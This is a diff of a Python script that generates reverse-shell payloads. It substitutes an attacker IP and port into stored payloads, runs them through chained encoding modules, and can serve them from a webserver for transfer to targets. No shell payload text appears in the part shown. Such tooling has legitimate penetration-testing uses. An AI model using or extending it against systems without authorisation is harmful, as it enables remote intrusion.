@@ -2,10 +2,14 @@
 #This script is used to help quickly generate reverse shells with a given IP
 import os,urllib.parse,socket,time,base64,sys
 from globe import curse
+from encoding_modules import encoding_map,encoding_configs
 from ProgMenu.progmenu import MENU
 from menuentries import *
 
 PARSER=MENU.parse(True,strict=True)
+
+#Set encoding configs:
+encoding_configs["zipfile"]=PARSER["zipfile"]
 
 def main():
 	#Retrieve the rshell data from the db
@@ -30,16 +34,20 @@ def main():
 		data=PARSER["prefix"]+data
 
 	#URL encode the data if the flag was called
-	if PARSER["urlencode"]:
-		data=urllib.parse.quote_plus(data,safe='^')
+	# if PARSER["urlencode"]:
+		# data=urllib.parse.quote_plus(data,safe='^')
 
 	#Replace the ^LOCAL_IP^ and ^LOCAL_PORT^ in the data if ip and port are required
 	# data=data.replace("^LOCAL_IP^",f"""\033[94m{PARSER["ip"]}\033[0m""").replace("^LOCAL_PORT^",f"""\033[95m{PARSER["port"]}\033[0m""")
 	data=data.replace(b"^LOCAL_IP^",f"""{PARSER["ip"]}""".encode()).replace(b"^LOCAL_PORT^",f"""{PARSER["port"]}""".encode())
 
 	#Base64 encode if the flag was called
-	if PARSER["base64encode"]:
-		data=base64.b64encode(data).decode()
+	# if PARSER["base64encode"]:
+		# data=base64.b64encode(data).decode()
+
+	#Encode the payload with any modules called, in the order they were called
+	for m in PARSER["encode"]:
+		data=encoding_map[m](data)
 
 	#Start a webserver that will serve the payload (for easy transfers to targets)
 	if PARSER["web"]:
